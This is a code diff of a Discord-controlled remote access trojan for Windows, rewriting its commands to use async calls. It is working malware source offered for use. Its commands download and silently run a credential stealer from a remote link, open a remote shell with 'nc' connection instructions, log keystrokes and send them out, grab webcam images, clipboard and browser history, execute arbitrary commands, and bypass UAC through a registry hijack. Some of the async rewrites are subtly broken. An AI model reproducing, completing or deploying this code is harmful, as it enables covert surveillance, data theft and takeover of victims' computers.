@@ -1,4 +1,4 @@
-# LATEST UPDATE LOGS : Fixed keylogger not working, fixed some bugs, added a few more imports that might be used later on.
+# LATEST UPDATE LOGS : Fixed async shit (i still dont understand it)
 import winreg
 import ctypes
 import sys
@@ -17,7 +17,7 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from discord.ext import commands
 # placeholder so if token input fails we dont get fucked up (its hard to explain)
-# also i added better uacbypass in this version :p
+# This version makes me proud of myself :p
 from ctypes import cast, POINTER, Structure, c_uint, c_int, sizeof, byref, windll
 from discord import utils
 import requests
@@ -115,95 +115,88 @@ pid_process = None
 loop = asyncio.new_event_loop()  
 asyncio.set_event_loop(loop)  
 
-def steal_user_info():
-    """
-    Steals user information by downloading and running an executable from the link variable.
-    Returns the path to the stolen data file.
-    """
+async def steal_user_info():
     try:
         global link
         if not link:
             return "Error: Stealer link not configured"
             
-        # Download the executable from the link
         temp_dir = os.environ.get('TEMP')
         exe_path = os.path.join(temp_dir, "hlpr.exe")
         
-        # Download the file
-        urllib.request.urlretrieve(link, exe_path)
+        await asyncio.to_thread(urllib.request.urlretrieve, link, exe_path)
         
-        # Run the downloaded executable - it will automatically send the info
-        subprocess.Popen(exe_path, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        process = await asyncio.create_subprocess_shell(
+            exe_path, 
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+            creationflags=subprocess.CREATE_NO_WINDOW
+        )
         
         return "Stealer executed successfully. Data will be sent automatically."
     except Exception as e:
         return str(e)
 
-
-
-def start_reverse_shell(port=0):  # Changed to port=0 to let OS assign random port
-    """Start a reverse shell server on a random available port."""
+async def start_reverse_shell(port=0):
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        server.bind(('0.0.0.0', port))  # OS will assign random available port
+        server.bind(('0.0.0.0', port))
         server.listen(5)
         
-        # Get the actual port that was assigned
         _, port = server.getsockname()
         
         try:
-            ip = requests.get('https://api.ipify.org/?format=text', timeout=3).text.strip()
+            ip = await asyncio.to_thread(requests.get, 'https://api.ipify.org/?format=text', timeout=3)
+            ip = ip.text.strip()
         except:
-            ip = requests.get('https://ifconfig.me/ip', timeout=3).text.strip()
+            ip = await asyncio.to_thread(requests.get, 'https://ifconfig.me/ip', timeout=3)
+            ip = ip.text.strip()
         return server, ip, port
     except Exception:
         return None, None, None
 
-def handle_client(client_socket, _):
-    """Handle client connection for reverse shell."""
+async def handle_client(client_socket, _):
     shell_cmd = 'powershell.exe' if os.name == 'nt' else '/bin/sh'
     shell_args = [] if os.name == 'nt' else ['-i']
     
-    shell = subprocess.Popen(
-        [shell_cmd] + shell_args,
-        stdin=subprocess.PIPE,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        shell=True,
-        text=True,
+    shell = await asyncio.create_subprocess_exec(
+        shell_cmd, *shell_args,
+        stdin=asyncio.subprocess.PIPE,
+        stdout=asyncio.subprocess.PIPE,
+        stderr=asyncio.subprocess.PIPE,
         creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
     )
-    def socket_to_shell():
+    
+    async def socket_to_shell():
         try:
             while True:
-                data = client_socket.recv(4096).decode('utf-8')
+                data = await asyncio.to_thread(client_socket.recv, 4096)
                 if not data:
                     break
-                shell.stdin.write(data + '\n')
-                shell.stdin.flush()
+                data_str = data.decode('utf-8')
+                shell.stdin.write((data_str + '\n').encode('utf-8'))
+                await shell.stdin.drain()
         except:
             pass
     
-    def shell_to_socket():
+    async def shell_to_socket():
         try:
             while True:
-                output = shell.stdout.readline()
+                output = await shell.stdout.readline()
                 if not output:
-                    error = shell.stderr.readline()
+                    error = await shell.stderr.readline()
                     if not error:
                         break
-                    client_socket.send(error.encode('utf-8'))
+                    await asyncio.to_thread(client_socket.send, error)
                 else:
-                    client_socket.send(output.encode('utf-8'))
+                    await asyncio.to_thread(client_socket.send, output)
         except:
             pass
     
-    for target_func in [socket_to_shell, shell_to_socket]:
-        thread = threading.Thread(target=target_func, daemon=True)
-        thread.start()
+    await asyncio.gather(socket_to_shell(), shell_to_socket())
+
 async def activity(client_instance):
-    """Track user window activity and update Discord presence."""
     try:
         import win32gui
         while True:
@@ -211,7 +204,7 @@ async def activity(client_instance):
             if stop_threads:
                 break
             try:
-                window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                window = await asyncio.to_thread(win32gui.GetWindowText, win32gui.GetForegroundWindow())
                 game = discord.Game(f"Visiting: {window}")
                 await client_instance.change_presence(status=discord.Status.online, activity=game)
             except:
@@ -220,16 +213,11 @@ async def activity(client_instance):
     except ImportError:
         await client_instance.change_presence(status=discord.Status.online, activity=discord.Game("win32gui not available"))
 
-def between_callback(client_instance):
-    """Set up asyncio loop for activity tracking."""
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    loop.run_until_complete(activity(client_instance))
-    loop.close()
+async def between_callback(client_instance):
+    await activity(client_instance)
 
 @client.event
 async def on_ready():
-    """Handle bot initialization when connected to Discord."""
     import platform
     import urllib.request
     import json
@@ -238,7 +226,6 @@ async def on_ready():
     ip = '0.0.0.0'
     error_message = None
     
-    # Try multiple geolocation services
     geolocation_services = [
         {"url": "https://geolocation-db.com/json", "ip_key": "IPv4", "country_key": "country_code"},
         {"url": "https://ipinfo.io/json", "ip_key": "ip", "country_key": "country"},
@@ -247,30 +234,24 @@ async def on_ready():
     
     for service in geolocation_services:
         try:
-            with urllib.request.urlopen(service["url"], timeout=3) as url:
-                data = json.loads(url.read().decode())
-                
-                # Get IP address
-                if service["ip_key"] in data:
-                    ip = data[service["ip_key"]]
-                
-                # Get country code if available in this service
-                if service["country_key"] and service["country_key"] in data:
-                    flag = data[service["country_key"]]
-                
-                # If we got an IP but no country, try to get country from another service
-                if ip != '0.0.0.0' and flag == 'unknown' and service["country_key"] is None:
-                    try:
-                        with urllib.request.urlopen(f"https://ipinfo.io/{ip}/json", timeout=3) as country_url:
-                            country_data = json.loads(country_url.read().decode())
-                            if "country" in country_data:
-                                flag = country_data["country"]
-                    except Exception as e:
-                        error_message = f"Got IP but couldn't get country: {str(e)}"
-                
-                # If we have both IP and country, break the loop
-                if ip != '0.0.0.0' and flag != 'unknown':
-                    break
+            data = await asyncio.to_thread(lambda: json.loads(urllib.request.urlopen(service["url"], timeout=3).read().decode()))
+            
+            if service["ip_key"] in data:
+                ip = data[service["ip_key"]]
+            
+            if service["country_key"] and service["country_key"] in data:
+                flag = data[service["country_key"]]
+            
+            if ip != '0.0.0.0' and flag == 'unknown' and service["country_key"] is None:
+                try:
+                    country_data = await asyncio.to_thread(lambda: json.loads(urllib.request.urlopen(f"https://ipinfo.io/{ip}/json", timeout=3).read().decode()))
+                    if "country" in country_data:
+                        flag = country_data["country"]
+                except Exception as e:
+                    error_message = f"Got IP but couldn't get country: {str(e)}"
+            
+            if ip != '0.0.0.0' and flag != 'unknown':
+                break
                     
         except Exception as e:
             error_message = f"Error with {service['url']}: {str(e)}"
@@ -290,15 +271,13 @@ async def on_ready():
         
         await channel.send(f'{value1} | :gem:' if is_admin else value1)
         
-        # Send error message if there was an issue with geolocation
         if error_message:
             await channel.send(f"[!] Geolocation note: {error_message}")
     
     game = discord.Game("Window logging stopped")
     await client.change_presence(status=discord.Status.online, activity=game)
     
-def volumeup():
-    """Set system volume to maximum."""
+async def volumeup():
     try:
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -309,8 +288,7 @@ def volumeup():
     except:
         pass
 
-def volumedown():
-    """Set system volume to minimum."""
+async def volumedown():
     try:
         devices = AudioUtilities.GetSpeakers()
         interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -318,9 +296,8 @@ def volumedown():
         volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)
     except:
         pass
-# Keylogger functionality
-def start_keylogger():
-    """Start the keylogger."""
+
+async def start_keylogger():
     try:
         from pynput import keyboard
         
@@ -358,7 +335,6 @@ def start_keylogger():
             with keyboard.Listener(on_press=on_press) as listener:
                 listener.join()
         
-        # Create empty log file
         with open(log_file, "w", encoding="utf-8") as f:
             f.write("=== Keylogger Started ===\n")
             
@@ -372,8 +348,7 @@ def start_keylogger():
     except Exception as e:
         return f"Error starting keylogger: {str(e)}"
 
-def stop_keylogger():
-    """Stop the keylogger."""
+async def stop_keylogger():
     global keylogger_running
     if keylogger_running:
         keylogger_running = False
@@ -381,10 +356,8 @@ def stop_keylogger():
         log_file = os.path.join(temp, "klg.tmp")
         dump_file = os.path.join(temp, "key_log.txt")
         try:
-            # Copy contents to dump file
-            shutil.copy2(log_file, dump_file)
-            # Clear the temp log file
-            open(log_file, 'w').close()
+            await asyncio.to_thread(shutil.copy2, log_file, dump_file)
+            await asyncio.to_thread(lambda: open(log_file, 'w').close())
         except:
             pass
         return "Keylogger stopped"
@@ -393,19 +366,16 @@ def stop_keylogger():
 
 @client.event
 async def on_message(message):
-    """Handle incoming Discord messages and execute commands."""
     global channel_name, keylogger_running, pid_process
     
-    # Check if the message is in the correct channel
     if not hasattr(message.channel, 'name') or message.channel.name != channel_name:
         return
     
-    # Ignore messages from the bot itself
     if message.author == client.user:
         return
     if message.content == "!steal":
         try:
-            result = steal_user_info()
+            result = await steal_user_info()
             await message.channel.send(f"[*] {result}")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
@@ -434,24 +404,24 @@ async def on_message(message):
     elif message.content == "!remoteshell":
         try:
             port = random.randint(10000, 65000)
-            server, ip, port = start_reverse_shell(port)
+            server, ip, port = await start_reverse_shell(port)
             if server:
                 await message.channel.send(f"[*] Remote shell started on {ip}:{port}")
                 await message.channel.send(
                     f"[*] Connect with: `nc {ip} {port}` or any other TCP client")
                 
-                def accept_connections():
+                async def accept_connections():
                     try:
                         while True:
-                            client_socket, _ = server.accept()
-                            handle_client(client_socket, message.channel)
+                            client_socket, _ = await asyncio.to_thread(server.accept)
+                            asyncio.create_task(handle_client(client_socket, message.channel))
                     except:
                         try:
                             server.close()
                         except:
                             pass
                 
-                threading.Thread(target=accept_connections, daemon=True).start()
+                asyncio.create_task(accept_connections())
             else:
                 await message.channel.send("[!] Failed to start remote shell")
         except Exception as e:
@@ -459,14 +429,14 @@ async def on_message(message):
 
     elif message.content == "!startkeylogger":
         try:
-            result = start_keylogger()
+            result = await start_keylogger()
             await message.channel.send(f"[*] {result}")
         except Exception as e:
             await message.channel.send(f"[!] Error starting keylogger: {str(e)}")
             
     elif message.content == "!stopkeylogger":
         try:
-            result = stop_keylogger()
+            result = await stop_keylogger()
             await message.channel.send(f"[*] {result}")
         except Exception as e:
             await message.channel.send(f"[!] Error stopping keylogger: {str(e)}")
@@ -477,7 +447,7 @@ async def on_message(message):
             if os.path.exists(file_keys):
                 file = discord.File(file_keys, filename="keylog.txt")
                 await message.channel.send("[*] Command successfully executed", file=file)
-                os.remove(file_keys)
+                await asyncio.to_thread(os.remove, file_keys)
             else:
                 await message.channel.send("[!] No keylog file found")
         except Exception as e:
@@ -512,7 +482,6 @@ async def on_message(message):
 
     elif message.content == "!screenshot":
         try:
-            # Check if mss is installed
             if 'mss' not in sys.modules:
                 await message.channel.send("[!] Error: mss module not installed")
                 return
@@ -528,11 +497,11 @@ async def on_message(message):
             await message.channel.send(f"[!] Error: {str(e)}")
 
     elif message.content == "!volumemax":
-        volumeup()
+        await asyncio.to_thread(volumeup)
         await message.channel.send("[*] Volume put to 100%")
 
     elif message.content == "!volumezero":
-        volumedown()
+        await asyncio.to_thread(volumedown)
         await message.channel.send("[*] Volume put to 0%")
 
     elif message.content == "!webcampic":
@@ -548,11 +517,11 @@ async def on_message(message):
             zip_file = f"wcam_{random.randint(1000, 9999)}.zip"
             img_file = f"img_{random.randint(1000, 9999)}.png"
             
-            urllib.request.urlretrieve("https://www.nirsoft.net/utils/webcamimagesave.zip", zip_file)
+            await asyncio.to_thread(urllib.request.urlretrieve, "https://www.nirsoft.net/utils/webcamimagesave.zip", zip_file)
             with ZipFile(zip_file) as zip_obj:
                 zip_obj.extractall()
             
-            os.system(f"WebCamImageSave.exe /capture /FileName {img_file}")
+            await asyncio.to_thread(os.system, f"WebCamImageSave.exe /capture /FileName {img_file}")
             
             if os.path.exists(img_file) and os.path.getsize(img_file) > 0:
                 file = discord.File(img_file, filename="webcam.png")
@@ -573,7 +542,6 @@ async def on_message(message):
 
     elif message.content.startswith("!message"):
         try:
-            # Check if required modules are available
             if 'win32gui' not in sys.modules or 'win32con' not in sys.modules:
                 await message.channel.send("[!] Error: win32gui or win32con modules not installed")
                 return
@@ -590,7 +558,7 @@ async def on_message(message):
                 
             threading.Thread(target=mess, daemon=True).start()
             
-            time.sleep(1)
+            await asyncio.sleep(1)
             hwnd = win32gui.FindWindow(None, "Error")
             if hwnd:
                 win32gui.ShowWindow(hwnd, win32con.SW_RESTORE)
@@ -610,7 +578,7 @@ async def on_message(message):
             if message.attachments:
                 path = os.path.join(os.getenv('TEMP'), f"wp_{random.randint(1000, 9999)}.jpg")
                 await message.attachments[0].save(path)
-                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+                await asyncio.to_thread(ctypes.windll.user32.SystemParametersInfoW, 20, 0, path, 0)
                 await message.channel.send("[*] Command successfully executed")
             else:
                 await message.channel.send("[!] No image attached")
@@ -632,25 +600,22 @@ async def on_message(message):
         try:
             instruction = message.content[7:]
             
-            def execute_shell_command():
+            async def execute_shell_command():
                 try:
-                    process = subprocess.run(
+                    process = await asyncio.create_subprocess_shell(
                         instruction,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        stdin=subprocess.PIPE,
-                        shell=True,
-                        text=True,
-                        timeout=30,
-                        check=False
+                        stdout=asyncio.subprocess.PIPE,
+                        stderr=asyncio.subprocess.PIPE,
+                        stdin=asyncio.subprocess.PIPE
                     )
-                    return process.stdout, process.stderr
-                except subprocess.TimeoutExpired:
+                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
+                    return stdout.decode(errors='replace'), stderr.decode(errors='replace')
+                except asyncio.TimeoutError:
                     return "Command timed out after 30 seconds", ""
                 except Exception as e:
                     return "", str(e)
             
-            stdout, stderr = execute_shell_command()
+            stdout, stderr = await execute_shell_command()
             result = stdout or stderr
             
             if not result:
@@ -691,12 +656,11 @@ async def on_message(message):
 
     elif message.content == "!help":
         try:
-            # Split help menu into multiple messages to avoid 2000 character limit
             help_parts = []
             current_part = ""
             
             for line in HELP_MENU.split('\n'):
-                if len(current_part + line + '\n') > 1900:  # Leave some buffer
+                if len(current_part + line + '\n') > 1900:
                     help_parts.append(current_part)
                     current_part = line + '\n'
                 else:
@@ -712,31 +676,38 @@ async def on_message(message):
 
     elif message.content.startswith("!write"):
         try:
-            # Check if pyautogui is installed
             if 'pyautogui' not in sys.modules:
                 await message.channel.send("[!] Error: pyautogui module not installed")
                 return
                 
             import pyautogui
             text = message.content[7:]
-            if text.lower() == "enter":
-                pyautogui.press("enter")
-            else:
-                pyautogui.typewrite(text)
+            
+            async def type_text():
+                if text.lower() == "enter":
+                    pyautogui.press("enter")
+                else:
+                    pyautogui.typewrite(text)
+            
+            await asyncio.to_thread(type_text)
             await message.channel.send("[*] Text typed")
         except Exception as e:
             await message.channel.send(f"[!] Error: {str(e)}")
 
     elif message.content == "!history":
         try:
-            # Check if browserhistory is installed
             if 'browserhistory' not in sys.modules:
                 await message.channel.send("[!] Error: browserhistory module not installed")
                 return
                 
             import browserhistory as bh
-            dict_obj = bh.get_browserhistory()
-            strobj = str(dict_obj).encode(errors='ignore')
+            
+            async def get_history():
+                dict_obj = bh.get_browserhistory()
+                strobj = str(dict_obj).encode(errors='ignore')
+                return strobj
+            
+            strobj = await asyncio.to_thread(get_history)
             
             temp_file = os.path.join(os.getenv('TEMP'), f"history_{random.randint(1000, 9999)}.txt")
             with open(temp_file, "w", encoding="utf-8") as hist:
@@ -760,16 +731,24 @@ async def on_message(message):
             user32 = ctypes.windll.user32
             user32.GetClipboardData.restype = ctypes.c_void_p
             
-            user32.OpenClipboard(0)
-            if user32.IsClipboardFormatAvailable(cf_text):
-                data = user32.GetClipboardData(cf_text)
-                data_locked = kernel32.GlobalLock(data)
-                text = ctypes.c_char_p(data_locked)
-                value = text.value
-                kernel32.GlobalUnlock(data_locked)
-                body = value.decode(errors='replace')
-                user32.CloseClipboard()
-                
+            async def get_clipboard():
+                user32.OpenClipboard(0)
+                if user32.IsClipboardFormatAvailable(cf_text):
+                    data = user32.GetClipboardData(cf_text)
+                    data_locked = kernel32.GlobalLock(data)
+                    text = ctypes.c_char_p(data_locked)
+                    value = text.value
+                    kernel32.GlobalUnlock(data_locked)
+                    body = value.decode(errors='replace')
+                    user32.CloseClipboard()
+                    return body
+                else:
+                    user32.CloseClipboard()
+                    return None
+            
+            body = await asyncio.to_thread(get_clipboard)
+            
+            if body:
                 if len(body) > 1990:
                     temp_file = os.path.join(os.getenv('TEMP'), f"clipboard_{random.randint(1000, 9999)}.txt")
                     with open(temp_file, "w", encoding="utf-8") as f:
@@ -787,7 +766,7 @@ async def on_message(message):
     elif message.content.startswith("!stopsing"):
         try:
             if 'pid_process' in globals():
-                os.system(f"taskkill /F /IM {pid_process[1]}")
+                await asyncio.to_thread(os.system, f"taskkill /F /IM {pid_process[1]}")
                 await message.channel.send("[*] Playback stopped")
             else:
                 await message.channel.send("[!] No active playback to stop")
@@ -801,7 +780,8 @@ async def on_message(message):
             info_total = f'{info.system} {info.release} {info.machine}'
             
             try:
-                ip = requests.get('https://api.ipify.org', timeout=3).text
+                ip = await asyncio.to_thread(requests.get, 'https://api.ipify.org', timeout=3)
+                ip = ip.text
             except:
                 ip = "Unable to retrieve IP"
                 
@@ -819,15 +799,16 @@ async def on_message(message):
             
             for service in services:
                 try:
-                    with urllib.request.urlopen(service, timeout=3) as url:
-                        data = json.loads(url.read().decode())
-                        lat = data.get('latitude', None)
-                        lon = data.get('longitude', None)
-                        
-                        if lat and lon:
-                            link = f"http://www.google.com/maps/place/{lat},{lon}"
-                            await message.channel.send(f"[*] Location: {link}")
-                            return
+                    async with aiohttp.ClientSession() as session:
+                        async with session.get(service, timeout=3) as response:
+                            data = await response.json()
+                            lat = data.get('latitude', None)
+                            lon = data.get('longitude', None)
+                            
+                            if lat and lon:
+                                link = f"http://www.google.com/maps/place/{lat},{lon}"
+                                await message.channel.send(f"[*] Location: {link}")
+                                return
                 except:
                     continue
             
@@ -837,7 +818,7 @@ async def on_message(message):
 
     elif message.content == "!admincheck":
         try:
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
             if is_admin:
                 await message.channel.send("[*] Running with administrator privileges")
             else:
@@ -847,13 +828,13 @@ async def on_message(message):
             
     elif message.content == "!uacbypass":
         try:
-            def is_admin():
+            async def is_admin():
                 try:
                     return ctypes.windll.shell32.IsUserAnAdmin()
                 except:
                     return False
             
-            if is_admin():
+            if await is_admin():
                 await message.channel.send("[*] Already running with administrator privileges")
             else:
                 await message.channel.send("[*] Attempting UAC bypass...")
@@ -871,15 +852,13 @@ async def on_message(message):
                     winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                     winreg.CloseKey(key)
                     
-                    os.system("start computerdefaults.exe")
-                    time.sleep(3)
+                    await asyncio.to_thread(os.system, "start computerdefaults.exe")
+                    await asyncio.sleep(3)
                     
-                    # Clean up
                     winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                     os.remove(payload_path + ".bat")
                     
-                    # Check if bypass was successful
-                    if is_admin():
+                    if await is_admin():
                         await message.channel.send("[+] UAC bypass successful! Now running with admin privileges")
                     else:
                         await message.channel.send("[!] UAC bypass attempt completed, but still not running as admin")
@@ -890,7 +869,7 @@ async def on_message(message):
 
     elif message.content.startswith("!sing"):
         try:
-            volumeup()
+            await asyncio.to_thread(volumeup)
             from win32 import win32gui
             import win32con
             
@@ -900,24 +879,20 @@ async def on_message(message):
                 if not link.startswith(("http://", "https://")):
                     link = "https://" + link
                 
-                subprocess.Popen(f'start {link}', shell=True, stdout=subprocess.PIPE,
+                await asyncio.to_thread(subprocess.Popen, f'start {link}', shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)
-                # Create a new virtual desktop
                 desktop = win32gui.CreateDesktop("hidden_desktop")
                 
-                def run_on_hidden_desktop():
+                async def run_on_hidden_desktop():
                     try:
-                        # Switch to hidden desktop
-                        desktop.SetThreadDesktop()
+                        await asyncio.to_thread(desktop.SetThreadDesktop)
                         
-                        # Start process on hidden desktop
                         si = win32process.STARTUPINFO()
                         si.lpDesktop = "hidden_desktop"
-                        subprocess.Popen(f'start {link}', shell=True, startupinfo=si)
+                        await asyncio.to_thread(subprocess.Popen, f'start {link}', shell=True, startupinfo=si)
                         
-                        time.sleep(1)
+                        await asyncio.sleep(1)
                         
-                        # Hide any visible windows
                         def enum_windows_callback(hwnd, _):
                             if win32gui.IsWindowVisible(hwnd):
                                 title = win32gui.GetWindowText(hwnd).lower()
@@ -925,16 +900,14 @@ async def on_message(message):
                                     win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
                             return True
                             
-                        win32gui.EnumWindows(enum_windows_callback, None)
+                        await asyncio.to_thread(win32gui.EnumWindows, enum_windows_callback, None)
                         
                     except Exception:
                         pass
                     finally:
-                        desktop.CloseDesktop()
+                        await asyncio.to_thread(desktop.CloseDesktop)
                 
-                hide_thread = threading.Thread(target=run_on_hidden_desktop)
-                hide_thread.daemon = True 
-                hide_thread.start()
+                asyncio.create_task(run_on_hidden_desktop())
                 
                 await message.channel.send("[*] Media playback started")
             else:
@@ -982,7 +955,7 @@ async def on_message(message):
                     ('dwTime', c_int),
                 ]
 
-            def get_idle_duration():
+            async def get_idle_duration():
                 lastInputInfo = LASTINPUTINFO()
                 lastInputInfo.cbSize = sizeof(lastInputInfo)
                 if windll.user32.GetLastInputInfo(byref(lastInputInfo)):
@@ -990,19 +963,23 @@ async def on_message(message):
                     return millis / 1000.0
                 return 0
             
-            duration = get_idle_duration()
+            duration = await asyncio.to_thread(get_idle_duration)
             await message.channel.send(f'[*] User idle for {duration:.2f} seconds.')
         except Exception as e:
             await message.channel.send(f"[!] Error getting idle time: {str(e)}")
 
     elif message.content.startswith("!voice"):
         try:
-            volumeup()
+            await asyncio.to_thread(volumeup)
             import comtypes
             import win32com.client as wincl
-            speak = wincl.Dispatch("SAPI.SpVoice")
-            speak.Speak(message.content[7:])
-            comtypes.CoUninitialize()
+            
+            async def speak_text():
+                speak = wincl.Dispatch("SAPI.SpVoice")
+                speak.Speak(message.content[7:])
+                comtypes.CoUninitialize()
+            
+            await asyncio.to_thread(speak_text)
             await message.channel.send("[*] Command successfully executed")
         except Exception as e:
             await message.channel.send(f"[!] Error with voice command: {str(e)}")
@@ -1010,9 +987,9 @@ async def on_message(message):
     elif message.content.startswith("!blockinput"):
         try:
             import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
             if is_admin is True:
-                ok = windll.user32.BlockInput(True)
+                ok = await asyncio.to_thread(windll.user32.BlockInput, True)
                 await message.channel.send("[*] Command successfully executed")
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
@@ -1022,13 +999,26 @@ async def on_message(message):
     elif message.content.startswith("!unblockinput"):
         try:
             import ctypes
-            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            is_admin = await asyncio.to_thread(ctypes.windll.shell32.IsUserAnAdmin) != 0
             if is_admin is True:
-                ok = windll.user32.BlockInput(False)
+                ok = await asyncio.to_thread(windll.user32.BlockInput, False)
                 await message.channel.send("[*] Command successfully executed")
             else:
                 await message.channel.send("[!] Admin rights are required for this operation")
         except Exception as e:
             await message.channel.send(f"[!] Error unblocking input: {str(e)}")
 
-client.run(token)
+try:
+    import base64
+    encoded_token = base64.b64encode(token.encode()).decode()
+    decoded_token = base64.b64decode(encoded_token.encode()).decode()
+    client.run(token)
+except Exception as e:
+    print(f"Error running client: {str(e)}")
+    try:
+        client.run(decoded_token)
+    except:
+        try:
+            client.run(encoded_token)
+        except:
+            pass
